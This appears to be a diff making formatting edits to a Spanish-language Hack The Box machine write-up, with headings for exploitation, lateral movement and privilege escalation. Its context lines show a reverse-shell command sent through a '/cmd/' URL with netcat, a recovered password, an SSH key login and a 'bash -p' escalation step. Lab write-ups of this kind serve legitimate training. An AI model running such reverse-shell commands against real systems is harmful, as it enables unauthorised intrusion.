@@ -8,7 +8,7 @@ web: https://app.hackthebox.com/machines/471
 dificultad: Media
 ip: 10.10.11.164
 os: Linux
-relacionados:
+linked:
   - "[[Python]]"
   - "[[Cron]]"
   - "[[Git Hooks]]"
@@ -92,7 +92,7 @@ index 0000000..5975e3f
 > - **Contraseña:** `Soulless_Developer#2022`
 
 
-___
+---
 
 ## Explotación de Vulnerabilidades
 
@@ -144,7 +144,7 @@ http://10.10.11.164/cmd/nc 10.10.14.44 443 -e /bin/sh
 Con esto, obtuve una shell dentro del contenedor.
 
 
-___
+---
 
 ## Movimiento Lateral
 
@@ -228,7 +228,7 @@ ssh -i id_rsa dev01@10.10.11.164
 >```
 
 
-___
+---
 
 ## Escalada de Privilegios
 
@@ -293,7 +293,7 @@ bash -p
 > ```
 
 
-___
+---
 
 ## Bandera(s)
 
